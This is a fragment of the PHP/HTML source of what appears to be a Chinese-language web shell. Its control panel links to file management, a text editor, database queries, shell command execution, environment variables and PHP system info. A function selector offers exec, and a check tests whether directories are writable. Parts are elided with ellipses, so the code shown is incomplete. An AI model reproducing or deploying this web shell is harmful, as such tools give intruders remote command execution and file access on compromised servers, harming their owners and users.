...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
    ...
    <tr>
        <td align="center"  bgcolor="#EEEEEE">【<a href="?action=dir&dir=.">文件管理</a>】【<a href="?action=editfile&dir=<?php=urlencode($dir);?>&editfile=<?php echo urlencode($dir);?>/">文本编辑器</a>】【<a href="?action=sql">数据库查询</a>】【<a href="?action=shell">Shell命令</a>】【<a href="?action=env">环境变量</a>】【<a href="?action=phpinfo">PHP系统信息</a>】【<a href="http://www.s8s8.net/forums/index.php?showtopic=15998">查看更新</a>】
        </td>
    </tr>
</table>
<br>
...
<?php /*if($action == "dir"){?>
	...
	<input name="mkdirb" type="submit" value="新建目录" class="style1">&nbsp;当前目录状态:【<b><?php echo $write = "不可写";if(is_dir($dir)) {if ($fp = @fopen("$dir/temp.tmp", 'w')) {@fclose($fp);@unlink("$dir/temp.tmp");$write = "可写";}}echo "$write</b>】";?>
	</td>
	</tr>
	</table>
	...
	<tr>
		...
		<td align="center" valign="top" bgcolor="#EEEEEE">
			函数:<select name="seletefunc" class="input">
				...
				<option value="exec" <?php ($seletefunc=="exec")?"selected":"";?>>exec</option>
